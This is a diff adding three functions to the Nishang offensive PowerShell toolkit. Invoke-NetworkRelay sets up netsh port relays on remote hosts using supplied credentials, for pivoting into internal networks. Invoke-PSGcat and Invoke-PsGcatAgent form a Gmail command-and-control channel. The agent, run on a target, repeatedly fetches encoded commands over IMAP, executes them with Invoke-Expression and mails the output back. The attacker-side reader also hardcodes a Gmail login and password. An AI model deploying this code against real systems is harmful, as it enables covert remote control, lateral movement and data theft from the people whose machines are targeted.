@@ -5834,3 +5834,697 @@ https://github.com/samratashok/nishang
         Write-Output "Payload added as Debugger for $ScreenSaverName"
     }
 }
+
+
+############################################# Add network relays##########################################
+function Invoke-NetworkRelay
+{    
+<#
+.SYNOPSIS
+Nishang script which can be used to run netsh port forwarding/relaying commands on remote computers. 
+
+.DESCRIPTION
+This script is a wrapper around the netsh Windows command's portproxy functionality. It could be used to create and remove 
+network relays between computers. The script is useful in scenarios when you want to access a port or service running on a
+target computer which is accessible only through another computer(s) between you and the target computer. Another interesting
+usecase is when you want to expose a local service to the network.
+
+.PARAMETER Relay
+Specify the type of relay from "v4tov4","v6tov4","v4tov6" and "v6tov6". Default is v4tov4.
+v4tov4 - Listen on v4 and connect to v4.
+
+
+.PARAMETER ListenAddress
+The local/listener IP address to which a remote port will be forwarded. Default is 0.0.0.0 (IPv4)
+
+.PARAMETER ListenPort
+The local/listener port to which a remote port will be forwarded. Default is 8888.
+
+.PARAMETER ConnectAddress
+The target/destination IP address whose port will be forwarded/mapped to a local port.
+
+.PARAMETER ConnectPort
+The target/destination port which will be forwarded/mapped to a local port.
+
+.PARAMETER ComputerName
+The name or IP address of the computer where the netsh command would be executed.
+
+.PARAMETER UserName
+Username for the computer specified with the ComputerName parameter.
+
+.PARAMETER Password
+Password for the computer specified with the ComputerName parameter.
+
+.PARAMETER Delete
+Use the Delete switch to delete a network relay specified by above options.
+
+.PARAMETER Show
+Use the Show switch to show all relays on a computer.
+
+.EXAMPLE
+PS > Invoke-NetworkRelay -Relay v4tov4 -ListenAddress 192.168.254.141 -Listenport 8888 -ConnectAddress 192.168.1.22  -ConnectPort 445 -ComputerName 192.168.254.141
+Add a network relay which listens on IPv4 and connects to IPv4 and forwards port 445 from 192.168.1.22 to port 8888 of 192.168.254.141. 
+
+.EXAMPLE
+PS > Invoke-NetworkRelay -Relay v6tov4 -ListenAddress :: -Listenport 8888 -ConnectAddress 192.168.1.22  -ConnectPort 445 -ComputerName 192.168.254.141
+Add a network relay which listens on IPv6 and connects to IPv4 and forwards port 445 from 192.168.1.22 to port 8888 of 192.168.254.141. 
+
+.EXAMPLE
+PS > Invoke-NetworkRelay -Relay v6tov4 -ListenAddress :: -Listenport 8888 -ConnectAddress fe80::19ed:c169:128c:b68d  -ConnectPort 445 -ComputerName domainpc -Username bharat\domainuser -Password Password1234
+Add a network relay which listens on IPv6 and connects to IPv6 and forwards port 445 from fe80::19ed:c169:128c:b68d to port 8888 of domainpc 
+
+.EXAMPLE
+PS > Invoke-NetworkRelay -Relay v4tov4 -ListenAddress 192.168.254.141 -Listenport 8888 -ConnectAddress 192.168.1.22  -ConnectPort 445 -ComputerName 192.168.254.141 -Delete
+Delete the network relay specified by the ListenAddress and Listen Port.
+
+.EXAMPLE
+PS > Invoke-NetworkRelay -ComputerName domainpc -Username bharat\domainuser -Password Password1234 -Show
+Show all network relays on the domainpc computer
+
+
+.LINK
+http://www.labofapenetrationtester.com/2015/04/pillage-the-village-powershell-version.html
+https://github.com/samratashok/nishang
+#>  
+    
+    [CmdletBinding(DefaultParameterSetName="AddOrDelete")] Param( 
+
+        [Parameter(Position = 0, Mandatory = $False, ParameterSetName="AddOrDelete")]
+        [ValidateSet("v4tov4","v6tov4","v4tov6","v6tov6")]
+        [String]
+        $Relay="v4tov4",
+
+        [Parameter(Position = 1, Mandatory = $False, ParameterSetName="AddOrDelete")]
+        [String]
+        $ListenAddress = "0.0.0.0",
+
+        [Parameter(Position = 2, Mandatory= $False, ParameterSetName="AddOrDelete")]
+        [String]
+        $ListenPort = 8888,
+
+        [Parameter(Position = 3, Mandatory = $True, ParameterSetName="AddOrDelete")]
+        [String]
+        $ConnectAddress,
+
+        [Parameter(Position = 4, Mandatory = $True, ParameterSetName="AddOrDelete")]
+        [String]
+        $ConnectPort,
+
+        [Parameter(Position = 5, Mandatory = $False, ParameterSetName="AddOrDelete")]
+        [Parameter(Position = 0, Mandatory = $False, ParameterSetName="Show")]
+        [String]
+        $ComputerName,
+
+        [Parameter(Position = 6, Mandatory = $False, ParameterSetName="AddOrDelete")]
+        [Parameter(Position = 1, Mandatory = $False, ParameterSetName="Show")]
+        $UserName,
+        
+        [Parameter(Position = 7, Mandatory = $False, ParameterSetName="AddOrDelete")]
+        [Parameter(Position = 2, Mandatory = $False, ParameterSetName="Show")]
+        $Password,
+
+        [Parameter(Mandatory = $False, ParameterSetName="AddOrDelete")]
+        [Switch]
+        $Delete,
+
+        [Parameter(Mandatory = $False, ParameterSetName="Show")]
+        [Switch]
+        $Show
+
+    )
+
+
+    #Check if Username and Password are provided
+    if ($UserName -and $Password)
+    {
+        $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
+	    $Creds = New-Object System.Management.Automation.PSCredential ($UserName, $SecurePassword)
+    }
+    else
+    {
+        $Creds = $False
+    }
+    
+    if ($Show)
+    {
+        if ($Creds)
+        {
+            Invoke-Command -ScriptBlock {netsh interface portproxy show all} -ComputerName $ComputerName -Credential $Creds
+        }
+        else
+        {
+            Invoke-Command -ScriptBlock {netsh interface portproxy show all} -ComputerName $ComputerName 
+        }
+    }
+    
+    if (!$Delete -and !$Show)
+    {
+        #Prepare relay commands
+        $V4tov4Relay = "netsh interface portproxy add v4tov4 listenport=$ListenPort listenaddress=$ListenAddress connectport=$ConnectPort connectaddress=$ConnectAddress protocol=tcp"
+        $V6toV4Relay = "netsh interface portproxy add v6tov4 listenport=$ListenPort listenaddress=$ListenAddress connectport=$ConnectPort connectaddress=$ConnectAddress"
+        $V4tov6Relay = "netsh interface portproxy add v4tov6 listenport=$ListenPort listenaddress=$ListenAddress connectport=$ConnectPort connectaddress=$ConnectAddress"
+        $V6toV6Relay = "netsh interface portproxy add v6tov6 listenport=$ListenPort listenaddress=$ListenAddress connectport=$ConnectPort connectaddress=$ConnectAddress protocol=tcp"
+
+        #Create a scriptblock depending upon the type of relay.
+        switch ($Relay)
+        {   
+            "v4tov4" 
+            {
+                $sb = [ScriptBlock]::Create($V4toV4Relay)
+                Write-Output "Initiating v4tov4 Relay. Listening on $ListenAddress, Port $ListenPort. Connecting to $Connectaddress, Port $Connectport"
+            }
+            "v6tov4" 
+            {
+                $sb = [ScriptBlock]::Create($V6toV4Relay)
+                Write-Output "Initiating v6tov4 Relay. Listening on $ListenAddress, Port $ListenPort. Connecting to $Connectaddress, Port $Connectport"
+            }
+            "v4tov6" 
+            {
+                $sb = [ScriptBlock]::Create($V4toV6Relay)
+                Write-Output "Initiating v4tov6 Relay. Listening on $ListenAddress, Port $ListenPort. Connecting to $Connectaddress, Port $Connectport"
+            }
+            "v6tov6" 
+            {
+                $sb = [ScriptBlock]::Create($V6toV6Relay)
+                Write-Output "Initiating v6tov6 Relay. Listening on $ListenAddress, Port $ListenPort. Connecting to $Connectaddress, Port $Connectport"
+            }
+        }
+    
+        #Execute the netsh command on remote computer
+        if ($Creds)
+        {
+            Invoke-Command -ScriptBlock $sb -ComputerName $ComputerName -Credential $Creds
+            Invoke-Command -ScriptBlock {param ($SBRelay) netsh interface portproxy show $SBRelay } -ArgumentList $Relay -ComputerName $ComputerName -Credential $Creds
+        }
+        else
+        {
+            Invoke-Command -ScriptBlock $sb -ComputerName $ComputerName
+            Invoke-Command -ScriptBlock {netsh interface portproxy show $Relay } -ComputerName $ComputerName
+        }
+    }
+    if ($Delete)
+    {
+        #Relay commands for deletion
+        $V4tov4Relay = "netsh interface portproxy delete v4tov4 listenport=$ListenPort listenaddress=$ListenAddress protocol=tcp"
+        $V6toV4Relay = "netsh interface portproxy delete v6tov4 listenport=$ListenPort listenaddress=$ListenAddress"
+        $V4tov6Relay = "netsh interface portproxy delete v4tov6 listenport=$ListenPort listenaddress=$ListenAddress"
+        $V6toV6Relay = "netsh interface portproxy delete v6tov6 listenport=$ListenPort listenaddress=$ListenAddress protocol=tcp"
+
+        #Create a scriptblock for deleting the relay, depending upon its type.
+        switch ($Relay)
+        {   
+            "v4tov4" 
+            {
+                $sbdelete = [ScriptBlock]::Create($V4toV4Relay)
+                Write-Output "Deleting v4tov4 Relay which was listening on $ListenAddress, Port $ListenPort and connecting to $Connectaddress, Port $Connectport"
+            }
+            "v6tov4" 
+            {
+                $sbdelete = [ScriptBlock]::Create($V6toV4Relay)
+                Write-Output "Deleting v6tov4 Relay which was listening on $ListenAddress, Port $ListenPort and connecting to $Connectaddress, Port $Connectport"
+            }
+            "v4tov6" 
+            {
+                $sbdelete = [ScriptBlock]::Create($V4toV6Relay)
+                Write-Output "Deleting v4tov6 Relay which was listening on $ListenAddress, Port $ListenPort and connecting to $Connectaddress, Port $Connectport"
+            }
+            "v6tov6" 
+            {
+                $sbdelete = [ScriptBlock]::Create($V6toV6Relay)
+                Write-Output "Deleting v6tov6 Relay which was listening on $ListenAddress, Port $ListenPort and connecting to $Connectaddress, Port $Connectport"
+            }
+        }
+    
+        #Execute the netsh command on remote computer
+        if ($Creds)
+        {
+            Invoke-Command -ScriptBlock $sbdelete -ComputerName $ComputerName -Credential $Creds
+            Invoke-Command -ScriptBlock {param ($SBRelay) netsh interface portproxy show $SBRelay } -ArgumentList $Relay -ComputerName $ComputerName -Credential $Creds
+        }
+        else
+        {
+            Invoke-Command -ScriptBlock $sbdelete -ComputerName $ComputerName
+            Invoke-Command -ScriptBlock {netsh interface portproxy show $Relay } -ComputerName $ComputerName
+        }
+    }
+}
+
+
+########################################## Gcat - Using Gmail for code execution ######################################
+
+########################################## Invoke-PSGcat needs to be run on attacker's machine ########################
+function Invoke-PSGcat
+{
+<#
+.SYNOPSIS
+Nishang script which can be used to send commands and scripts to Gmail which can then be run on a target using Invoke-PSGcatAgent.
+
+.DESCRIPTION
+This script is capable of sending commands and/or scripts to Gmail. A valid Gmail username and password is required.
+The command is compressed and base64 encoded and sent to the Gmail account. On the target, Invoke-PsGcatAgent must be executed
+which will read the last sent command/script, decode it, execute it and send the output back to Gmail.
+In the Gmail security settings of that account "Access for less secure apps" must be turned on. Make sure that you use
+a throw away account.
+
+In the interactive mode, to execute a script, type "script" at the PsGcat prompt and provide full path to the script.
+To read output, type "GetOutput" at the PsGcat prompt.
+
+Currently, the output is not pretty at all and you will see the script interacting with Gmail IMAP. 
+
+.PARAMETER Username
+Username of the Gmail account you want to use. 
+
+.PARAMETER Password
+Password of the Gmail account you want to use. 
+
+.PARAMETER AgentID
+AgentID is currently unused and would be used with multiple agent support in future. 
+
+.PARAMETER Payload
+In Non-interactive mode, the PowerShell command you want to send to the Gmail account.
+
+.PARAMETER ScriptPath
+In Non-interactive mode, the PowerShell script you want to send to the Gmail account.
+
+.PARAMETER NonInteractive
+Use the non-interactive mode. Execute the provided command or payload and exit.
+
+.PARAMETER GetOutput
+Retrieve last ouput from Gmail.
+
+.EXAMPLE
+PS > Invoke-PSGcat -Username psgcatlite -password pspassword
+Use GetOutput to get output.
+Use Script to specify a script.
+PsGcat: Get-Process
+Command sent to psgcatlite@gmail.com
+
+
+Above shows an example where Get-Process is sent to Gmail.
+
+.EXAMPLE
+PS > Invoke-PSGcat -Username psgcatlite -password pspassword
+Use GetOutput to get output.
+Use Script to specify a script.
+PsGcat: GetOutput
+-----Lot of IMAP text-----
+* 8 FETCH (BODY[TEXT] {5206}
+System.Diagnostics.Process (BTHSAmpPalService) System.Diagnostics
+.Process (BTHSSecurityMgr) System.Diagnostics.Process (btplayerct
+rl) System.Diagnostics.Process (capiws) System.Diagnostics.Proces
+s (conhost) System.Diagnostics.Process (conhost) System.Diagnosti
+
+
+Above shows how to retrieve output from Gmail. Note that the output is ugly and you may need to run GetOutput few times
+before the complete output is read. Also, the Invoke-PsGcatAgent must execute the command before an output could be retrieved.
+
+
+.EXAMPLE
+PS > Invoke-PSGcat -Username psgcatlite -password pspassword
+Use GetOutput to get output.
+Use Script to specify a script.
+PsGcat: script
+Provide complete path to the PowerShell script.: C:\test\reverse_powershell.ps1
+Command sent to psgcatlite@gmail.com
+Use GetOutput to get output.
+
+
+Use above to send a PowerShell script to the Gmail account. Script execution is not very reliable right now and you may see
+the agent struggling to pull a big encoded script. Also, make sure that the function call for script is done from the
+script itself.
+
+.EXAMPLE
+PS > Invoke-PSGcat -Username psgcatlite -password pspassword -Payload Get-Service -NonInteractive
+Send a command to the Gmail account without any interaction. 
+
+.EXAMPLE
+PS > Invoke-PSGcat -Username psgcatlite -password pspassword -ScriptPath C:\test\reverse_powershell.ps1 -NonInteractive
+Send a script to the Gmail account without any interaction.
+
+.EXAMPLE
+PS > Invoke-PSGcat -Username psgcatlite -password pspassword -GetOutput
+Get output from the gmail account.
+
+.LINK
+http://www.labofapenetrationtester.com/2015/04/pillage-the-village-powershell-version.html
+https://github.com/samratashok/nishang
+#>      
+    [CmdletBinding(DefaultParameterSetName="Interactive")] Param(
+
+        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="Interactive")]
+        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="NonInteractive")]
+        [String]
+        $Username,
+
+        [Parameter(Position = 1, Mandatory = $false, ParameterSetName="Interactive")]
+        [Parameter(Position = 1, Mandatory = $false, ParameterSetName="NonInteractive")]
+        [String]
+        $Password,
+
+        [Parameter(Position = 2, Mandatory = $false, ParameterSetName="Interactive")]
+        [Parameter(Position = 2, Mandatory = $false, ParameterSetName="NonInteractive")]
+        [String]
+        $AgentID,
+        
+        [Parameter(Position = 3, Mandatory = $false, ParameterSetName="NonInteractive")]
+        [String]
+        $Payload,
+
+        [Parameter(Position = 4, Mandatory = $false, ParameterSetName="NonInteractive")]
+        [String]
+        $ScriptPath,
+
+        [Parameter(Mandatory = $false, ParameterSetName="NonInteractive")]
+        [Switch]
+        $NonInteractive,
+
+        [Parameter(Mandatory = $false)]
+        [Switch]
+        $GetOutput
+
+    )
+    #$ErrorActionPreference = "SilentlyContinue"
+
+    function SendCommand ($Payload, $Username, $Password)
+    {
+        
+        try 
+        {
+            $ms = New-Object IO.MemoryStream
+            $action = [IO.Compression.CompressionMode]::Compress
+            $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
+            $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
+            $Payload | ForEach-Object {$sw.WriteLine($_)}
+            $sw.Close()
+    
+            # Base64 encode stream
+            $Compressed = [Convert]::ToBase64String($ms.ToArray())
+    
+            #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
+            $smtpserver = “smtp.gmail.com”
+            $msg = new-object Net.Mail.MailMessage
+            $smtp = new-object Net.Mail.SmtpClient($smtpServer )
+            $smtp.EnableSsl = $True
+            $smtp.Credentials = New-Object System.Net.NetworkCredential(“$username”, “$password”); 
+            $msg.From = “$username@gmail.com”
+            $msg.To.Add(”$username@gmail.com”)
+            $msg.Subject = "Command"
+            $msg.Body = "##" + $Compressed
+            $smtp.Send($msg)
+            Write-Output "Command sent to $username@gmail.com"
+        }
+        catch 
+        {
+            Write-Warning "Something went wrong! Check if Username/Password are correct and you can connect to gmail from insecure apps." 
+            Write-Error $_
+        }
+    }
+
+    function ReadResponse
+    {
+        try 
+        {
+            $tcpClient = New-Object -TypeName System.Net.Sockets.TcpClient
+
+            # Connect to gmail
+            $tcpClient.Connect("imap.gmail.com", 993)
+
+            if($tcpClient.Connected) 
+            {
+                # Create new SSL Stream for tcpClient
+                [System.Net.Security.SslStream] $sslStream = $tcpClient.GetStream()
+                
+                # Authenticating as client
+                $sslStream.AuthenticateAsClient("imap.gmail.com");
+
+                if($sslStream.IsAuthenticated) 
+                {
+                # Asssigned the writer to stream
+                [System.IO.StreamWriter] $sw = $sslstream
+
+                # Assigned reader to stream
+                [System.IO.StreamReader] $reader = $sslstream
+                $script:result = ""
+                $sb = New-Object System.Text.StringBuilder
+                $mail =""
+                $responsebuffer = [Array]::CreateInstance("byte", 2048)
+                
+
+                function ReadResponse ($command)
+                {
+                    $sb = New-Object System.Text.StringBuilder
+                    if ($command -ne "")
+                    {
+                        $buf = [System.Text.Encoding]::ASCII.GetBytes($command)
+                        $sslStream.Write($buf, 0, $buf.Length)
+                    }
+                    $sslStream.Flush()
+                    $bytes = $sslStream.Read($responsebuffer, 0, 2048)
+                    $str = $sb.Append([System.Text.Encoding]::ASCII.GetString($responsebuffer))
+                    $sb.ToString()
+                    $temp = $sb.ToString() | Select-String "\* SEARCH"
+                    if ($temp)
+                    {
+                        $fetch = $temp.ToString() -split "\$",2
+                        $tmp = $fetch[0] -split "\* SEARCH " -split " " -replace "`n"
+                        [int]$mail = $tmp[-1]
+                        $cmd = ReadResponse("$ FETCH $mail BODY[TEXT]`r`n", "1")
+                        $cmd -replace '='
+                    }
+                }
+                ReadResponse ""
+                ReadResponse ("$ LOGIN " + "psgcatlite@gmail.com" + " " + "powershellchabi" + "  `r`n") | Out-Null
+                ReadResponse("$ SELECT INBOX`r`n") | Out-Null
+                ReadResponse("$ SEARCH SUBJECT `"Output`"`r`n")
+                ReadResponse("$ LOGOUT`r`n")  | Out-Null
+                } 
+                else 
+                {
+                    Write-Error "You were not authenticated. Quitting."
+                }
+            } 
+            else 
+            {
+                Write-Error "You are not connected to the host. Quitting"
+            }
+        }
+
+        catch 
+        {
+            Write-Warning "Something went wrong! Check if Username/Password are correct, you can connect to gmail from insecure apps and if there is output email in the inbox" 
+            Write-Error $_
+        }
+    }
+
+    #For only reading the output.
+    if ($GetOutput)
+    {
+        Write-Verbose "Reading Output from Gmail"
+        ReadResponse ""
+    }
+    #Non interactive
+    elseif ($NonInteractive)
+    {
+        #If Scriptpath is provided, read the script.
+        if ($ScriptPath)
+        {
+            $Payload = [IO.File]::ReadAllText("$ScriptPath") -replace "`n"
+            Write-Verbose "Sending Payload to $Username@gmail.com $Payload"
+            SendCommand $Payload $Username $Password
+        }
+        #else use the command
+        else
+        {
+            Write-Verbose "Sending Payload to $Username@gmail.com  $Payload"
+            SendCommand $Payload $Username $Password
+        }
+
+    }
+    #Interactive prompt
+    else
+    {
+        while($Payload -ne "exit")
+        {
+            
+            Write-Output "Use GetOutput to get output."
+            Write-Output "Use Script to specify a script."
+            $Payload = Read-Host -Prompt "PsGcat"
+            if ($Payload -eq "GetOutput")
+            {
+                Write-Verbose "Reading Output from Gmail"
+                ReadResponse ""
+            }
+            if ($Payload -eq "Script")
+            {
+                $path = Read-Host -Prompt "Provide complete path to the PowerShell script."
+                $Payload = [IO.File]::ReadAllText("$path") -replace "`n"
+                Write-Verbose "Sending Payload to $Username@gmail.com  $Payload"
+                SendCommand $Payload $Username $Password
+            }
+            else
+            {
+                Write-Verbose "Sending Payload to $Username@gmail.com  $Payload"
+                SendCommand $Payload $Username $Password
+            }
+        }
+    }
+}
+
+########################################## Invoke-PsGcatAgent needs to be run on target machine ########################
+function Invoke-PsGcatAgent
+{
+<#
+.SYNOPSIS
+Nishang script which can be used to execute commands and scripts from Gmail uploaded by Invoke-PSGcat.
+
+.DESCRIPTION
+This script is capable of executing commands and/or scripts from Gmail and send the output back. 
+A valid Gmail username and password is required.
+This script must be executed on the target and commands should be uploaded by Invoke-PsGcat on attacker's machine.
+
+In the Gmail security settings of that account "Access for less secure apps" must be turned on. Make sure that you use
+a throw away account.
+
+Script execution is not very reliable right now and you may see the agent struggling to pull a big encoded script.
+
+.PARAMETER Username
+Username of the Gmail account you want to use. 
+
+.PARAMETER Password
+Password of the Gmail account you want to use. 
+
+.PARAMETER AgentID
+AgentID is currently unused and would be used with multiple agent support in future. 
+
+.PARAMETER Delay
+Delay in seconds after a successful execution. Default is 60.
+
+.EXAMPLE
+PS > Invoke-PSGcatAgent -Username psgcatlite -password pspassword -Delay 10
+Pull latest command/script from Gmail and execute with a delay of 10 seconds.
+
+.LINK
+http://www.labofapenetrationtester.com/2015/04/pillage-the-village-powershell-version.html
+https://github.com/samratashok/nishang
+#>
+
+    [CmdletBinding()] Param(
+
+        [Parameter(Position = 0, Mandatory = $false)]
+        [String]
+        $Username,
+
+        [Parameter(Position = 1, Mandatory = $false)]
+        [String]
+        $Password,
+
+        [Parameter(Position = 2, Mandatory = $false)]
+        [String]
+        $AgentID,
+
+        [Parameter(Position = 3, Mandatory = $false)]
+        [String]
+        $Delay = 60
+    )
+    
+    
+    $ErrorActionPreference = "SilentlyContinue"
+                
+    while ($true)
+    {
+        try 
+        {
+
+            #Basic IMAP interaction from http://learningpcs.blogspot.in/2012/01/powershell-v2-read-gmail-more-proof-of.html
+            $tcpClient = New-Object -TypeName System.Net.Sockets.TcpClient
+
+            # Connect to gmail
+            $tcpClient.Connect("imap.gmail.com", 993)
+            if($tcpClient.Connected) 
+            {
+                # Create new SSL Stream for tcpClient
+                [System.Net.Security.SslStream] $sslStream = $tcpClient.GetStream()
+                
+                # Authenticating as client
+                $sslStream.AuthenticateAsClient("imap.gmail.com");
+                $script:result = ""
+                $sb = New-Object System.Text.StringBuilder
+                $mail =""
+                $responsebuffer = [Array]::CreateInstance("byte", 2048)
+                
+                #Send IMAP commands and read response
+                function ReadResponse ($command, $ReturnResult)
+                {
+                    $sb = New-Object System.Text.StringBuilder
+                    if ($command -ne "")
+                    {
+                        $command
+                        $buf = [System.Text.Encoding]::ASCII.GetBytes($command)
+                        $sslStream.Write($buf, 0, $buf.Length)
+                    }
+                    $sslStream.Flush()
+                    $bytes = $sslStream.Read($responsebuffer, 0, 2048)
+                    $str = $sb.Append([System.Text.Encoding]::ASCII.GetString($responsebuffer))
+                    $sb.ToString()
+                    
+                    #Select the output of SEARCH IMAP command
+                    $temp = $sb.ToString() | Select-String "\* SEARCH"
+                    if ($temp)
+                    {
+                        $fetch = $temp.ToString() -split "\$",2
+                        $tmp = $fetch[0] -split "\* SEARCH " -split " " -replace "`n"
+                        [int]$mail = $tmp[-1]
+                        
+                        #FETCH the body of the last email which matches the SEARCH criteria
+                        $cmd = ReadResponse("$ FETCH $mail BODY[TEXT]`r`n", "1")
+                        $tmp = $cmd[2] -split "\)",2 -replace "`n" 
+                        $TempCommand = ($tmp[0] -split "##",2)[1] -replace "(?<=\=)3D" -replace "`r"
+                        $EncCommand = $TempCommand -replace '(?!={1,2}$)=','' -replace "`r"
+                        Write-Verbose "Executing Encoded Command $EncCommand"
+                        #Decode
+                        $dec = [System.Convert]::FromBase64String($EncCommand)
+                        $ms = New-Object System.IO.MemoryStream
+                        $ms.Write($dec, 0, $dec.Length)
+                        $ms.Seek(0,0) | Out-Null
+                        $cs = New-Object System.IO.Compression.DeflateStream ($ms, [System.IO.Compression.CompressionMode]::Decompress)
+                        $sr = New-Object System.IO.StreamReader($cs)
+                        $cmd = $sr.readtoend()
+                        $result = Invoke-Expression $cmd -ErrorAction SilentlyContinue
+
+                        #Send results to gmail
+                        #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
+                        $smtpserver = “smtp.gmail.com”
+                        $msg = new-object Net.Mail.MailMessage
+                        $smtp = new-object Net.Mail.SmtpClient($smtpServer )
+                        $smtp.EnableSsl = $True
+                        $smtp.Credentials = New-Object System.Net.NetworkCredential(“$Username”, “$Password”); 
+                        $msg.From = “$Username@gmail.com”
+                        $msg.To.Add(”$Username@gmail.com”)
+                        $msg.Subject = "Output from $env:Computername"
+                        $msg.Body = $result
+                        $smtp.Send($msg)
+                    }
+                }
+
+                #Interact with Gmail using IMAP
+                ReadResponse ""
+                ReadResponse ("$ LOGIN " + "$Username@gmail.com" + " " + "$Password" + "  `r`n") | Out-Null
+                ReadResponse("$ SELECT INBOX`r`n") | Out-Null
+                ReadResponse("$ SEARCH SUBJECT `"Command`"`r`n")
+                ReadResponse("$ LOGOUT`r`n")  | Out-Null
+                Start-Sleep -Seconds $Delay
+                
+            } 
+
+            else 
+            {
+                Write-Error "You are not connected to the host. Quitting"
+            }
+
+        }
+        catch 
+        {
+            $_
+        }
+    }
+}           
